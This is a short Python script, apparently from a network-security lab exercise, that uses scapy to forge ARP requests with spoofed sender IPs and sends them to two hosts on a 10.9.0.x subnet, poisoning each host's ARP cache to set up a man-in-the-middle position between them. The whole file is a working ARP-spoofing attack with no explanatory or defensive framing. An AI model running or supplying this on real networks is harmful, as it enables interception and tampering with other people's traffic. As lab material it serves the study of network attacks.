#!/usr/bin/env python3
from scapy.all import *

def get_arp_spoof_pkt(victim_ip, victim_mac, spoof_ip):
    E_layer = Ether()
    E_layer.dst = victim_mac
    A_layer = ARP()
    A_layer.psrc = spoof_ip
    A_layer.pdst = victim_ip
    A_layer.op = "who-has"
    return E_layer / A_layer

A = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"
B = "10.9.0.6"
B_mac = "02:42:0a:09:00:06"

pkt_a = get_arp_spoof_pkt(A, A_mac, B)
pkt_b = get_arp_spoof_pkt(B, B_mac, A)
pkt_a.show()
pkt_b.show()
sendp(pkt_a)
sendp(pkt_b)

